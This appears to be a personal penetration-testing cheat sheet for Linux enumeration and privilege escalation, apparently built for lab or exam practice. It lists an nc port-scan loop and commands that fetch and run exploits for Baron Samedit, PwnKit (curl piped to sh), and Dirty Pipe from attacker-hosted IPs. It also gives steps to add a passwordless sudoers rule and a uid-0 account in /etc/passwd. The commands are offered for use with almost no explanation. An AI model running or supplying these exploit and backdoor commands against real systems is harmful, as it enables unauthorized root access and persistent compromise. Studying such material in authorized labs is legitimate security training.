# Linux Enum

## Ansible vault decrypt

> Source: `01101100-C0D3X-00110110.md` → `Linux > Ansible vault decrypt`

```
ansible-vault decrypt <file.yml> --output decrypted.txt
```


## PortScan (NC)

> Source: `01101100-C0D3X-00110110.md` → `Linux > PortScan (NC)`

```
for i in $(echo "<IP>"|tr "," "\n"); do echo -e "21\n22\n80\n135\n443\n445\n88\n389\n1433\n3306\n3389\n5985\n5986\n8001\n8002\n8080\n8081\n8443" | xargs -i nc -w 1 -zvn $i {}; done
```


## Proof.txt Linux 1

> Source: `01101100-C0D3X-00110110.md` → `Other > Proof.txt Linux 1`

```
whoami && hostname && ip a && cat proof.txt
```


## Proof.txt Linux 2

> Source: `01101100-C0D3X-00110110.md` → `Other > Proof.txt Linux 2`

```
whoami && hostname && ifconfig && cat proof.txt
```


## Exploits

> Source: `01101100-RUN3-00110110.md` → `Linux > Exploits`

💡 Try the suggested linpeas exploit. Could maybe use one of those:

Sudo Baron Samedit (Sudo <1.9.5p2)

```
wget http://192.168.45.218/SudoBaron/exploit_nss.py
python3 exploit_nss.py
```

[https://github.com/worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)

PwnKit (SUID pkexec)

```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

[https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

DirtyCow (Linux kernel <4.8.3)

[https://github.com/dirtycow/dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io)

Dirty pipe (Linux kernel >5.8)

```
wget http://192.168.49.136/DirtyPipe/compile.sh
wget http://192.168.49.136/DirtyPipe/exploit-1.c
wget http://192.168.49.136/DirtyPipe/exploit-2.c
chmod +x compile.sh
./compile.sh
./exploit-1
# or
./exploit-2
```

[GitHub - AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits: A collection of exploits and documentation that can be used to exploit the Linux Dirty Pipe vulnerability.](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/tree/main)

Polkit (version >0.113)

[https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)

```
'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
```
```
openssl passwd 123
root2:{HASH}:0:0:root:/root:/bin/bash
```

[Writable /etc/passwd → Root](https://www.notion.so/Writable-etc-passwd-Root-7b5d52c6cf954cc79a13813a525c68e8?pvs=21)
